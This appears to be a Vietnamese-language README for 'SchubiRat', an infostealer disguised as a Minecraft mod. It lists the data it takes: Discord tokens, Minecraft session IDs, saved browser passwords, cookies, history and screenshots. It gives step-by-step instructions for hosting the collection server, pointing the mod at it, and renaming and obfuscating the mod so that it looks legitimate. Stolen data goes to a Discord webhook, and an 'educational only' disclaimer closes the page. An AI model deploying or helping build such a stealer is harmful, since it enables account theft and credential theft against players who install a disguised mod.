# SchubiRat

![Schubi](https://github.com/Schubilegend/SchubiRat/assets/90055814/a212304a-055e-4e1a-8a92-3b53bc4201ab)
# QUAN TRỌNG
Tất cả các vấn đề trước đây sẽ được giải quyết trong bản phát hành mới nhất

# Tính năng
- Không thể xóa webhook
- Chống thư rác tốt
- Lấy
- IP
- ID phiên Minecraft
- Mã thông báo Discord từ:
- Discord
- Discord PTB
- Discord Canary
- Lightcord
- Mọi trình duyệt phổ biến dựa trên Chromium
- Mật khẩu trình duyệt đã lưu
- Cookie
- Lịch sử trình duyệt
- Ảnh chụp màn hình máy tính
- Tài khoản Minecraft được lưu trong Lunar Client
- Tài khoản Minecraft được lưu trong Essential
- Bỏ qua các giới hạn về độ dài khóa tối đa được phép
- Không phụ thuộc vào bất kỳ dịch vụ lưu trữ tệp của bên thứ ba nào như [Anonfiles](https://anonfiles.com) hoặc [Gofile](https://gofile.io)
- Có thể tùy chỉnh nhúng và webhook, không có hình mờ
# Thiết lập
## Máy chủ
Máy chủ trên VPS
1. Tải xuống kho lưu trữ
2. Đặt mọi thứ bên trong thư mục `server` vào bất kỳ thư mục nào trên VPS của bạn
3. Chỉnh sửa `server/config.json` theo ý thích của bạn
4. Cài đặt python/pip và tất cả các yêu cầu từ `server/requirements.txt`
5. Chạy `server/main.py`
#### HOẶC
Máy chủ trên [render](https://render.com)
1. Tạo một nhánh riêng của kho lưu trữ này (KHÔNG nhấp vào nhánh trên github, bạn phải tải xuống và tải lại lên một kho lưu trữ riêng)
2. Chỉnh sửa `server/config.json` theo ý thích của bạn
3. Tạo một tài khoản render mới bằng tài khoản GitHub mà bạn đã nhánh kho lưu trữ
4. Tạo một dịch vụ web mới
5. Chọn kho lưu trữ đã nhánh
6. Đặt tên cho dịch vụ, chọn main làm nhánh, `server` làm thư mục gốc, Python 3 làm thời gian chạy, Xây dựng lệnh `pip install -r requirements.txt` và lệnh Start `python main.py` hoặc `python3 main.py`
7. Đợi dịch vụ được xây dựng
## Mod/Client
1. Tải xuống kho lưu trữ
2. Thay đổi IP máy chủ trong `scr/main/java/dev/schubilegend/SchubiMod.java` thành IP của VPS / URL của dịch vụ render của bạn
3. Tùy chọn: Thay đổi tên của các lớp/thư mục để trông hợp lệ hơn
4. Biên dịch mod (JDK 17 trong cài đặt gradle và JDK 8 trong cài đặt dự án của bạn)
#### HOẶC
1. Tải xuống [release](https://github.com/Schubilegend/SchubiRat/releases)
2. Thay đổi URL / IP của mod thành URL / IP của bạn bằng trình soạn thảo [java string editor](https://leonardosnt.github.io/jar-string-editor) hoặc [Recaf](https://github.com/Col-E/Recaf/releases/tag/2.21.13) (Tìm "URL CỦA BẠN TẠI ĐÂY")
3. Lưu và tải xuống mod

**Tùy chọn: Làm tối nghĩa bản mod**

**Nếu bạn có quá nhiều tiền, hãy sử dụng [jnic](https://jnic.dev) trình làm tối nghĩa bản quyền để giải mã **

### Nếu mọi thứ đều ổn, vui lòng ⭐ ủng hộ kho lưu trữ này ❤️

# Config
Bạn có thể tùy chỉnh tính năng chống thư rác và thiết kế của các mã nhúng bằng cách chỉnh sửa `server/config.json`.
<br>
Cấu hình không được tải lại tự động, vì vậy bạn phải khởi động lại máy chủ để các thay đổi có hiệu lực.
| Name                       | Possible values                 | Description                                                                                                                    |
|----------------------------|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------|
| webhook                    | Any discord webhook URL         | The webhook the info is sent to                                                                                                |
| webhook_name               | Any string, max 80 characters   | The name the webhook will have when sending the info                                                                           |
| webhook_avatar             | Any URL to a PNG or JPG file    | The avatar the webhook will have when sending the info                                                                         |
| message                    | Any string, max 2000 characters | The message the webhook will send with the info. `%IP%` will automatically be replaced with the IP of the client               |
| codeblock_type             | `small` or `big`                | The type of codeblock used for the embed fields                                                                                |
| ip_ratelimit               | Any number                      | The number of times a client can send a request before getting rate-limited                                                    |
| reset_ratelimit_after      | Any number                      | The number of minutes a client has to wait after getting rate-limited before sending another request                           |
| mc_embed_color             | Any hex color code              | The color of the Minecraft embed                                                                                               |
| mc_embed_title             | Any string, max 256 characters  | The title of the Minecraft embed                                                                                               |
| mc_embed_footer_text       | Any string, max 2048 characters | The footer text of the Minecraft embed                                                                                         |
| mc_embed_footer_icon       | Any URL to a PNG or JPG file    | The footer icon of the Minecraft embed                                                                                         |
| discord_embed_color        | Any hex color code              | The color of the Discord embed                                                                                                 |
| discord_embed_title        | Any string, max 256 characters  | The title of the Discord embed                                                                                                 |
| discord_embed_footer_text  | Any string, max 2048 characters | The footer text of the Discord embed                                                                                           |
| discord_embed_footer_icon  | Any URL to a PNG or JPG file    | The footer icon of the Discord embed                                                                                           |
| password_embed_color       | Any hex color code              | The color of the password embed                                                                                                |
| password_embed_title       | Any string, max 256 characters  | The title of the password embed                                                                                                |
| password_embed_footer_text | Any string, max 2048 characters | The footer text of the password embed                                                                                          |
| password_embed_footer_icon | Any URL to a PNG or JPG file    | The footer icon of the password embed                                                                                          |
| file_embed_color           | Any hex color code              | The color of the file embed                                                                                                    |
| file_embed_title           | Any string, max 256 characters  | The title of the file embed                                                                                                    |
| file_embed_footer_text     | Any string, max 2048 characters | The footer text of the file embed                                                                                              |
| file_embed_footer_icon     | Any URL to a PNG or JPG file    | The footer icon of the file embed                                                                                              |
| validate_session           | `true` or `false`               | If requests containing a invalid session id or one that isn't matching the uuid/ign of the minecraft account should be blocked |

# TUYÊN BỐ MIỄN TRỪ TRÁCH NHIỆM
**Tôi không chịu trách nhiệm cho bất kỳ thiệt hại nào do chương trình này gây ra. Chương trình này chỉ nhằm mục đích giáo dục. Vui lòng tự chịu rủi ro khi sử dụng.**



[get back to the top](https://github.com/Schubilegend/SchubiRat#)
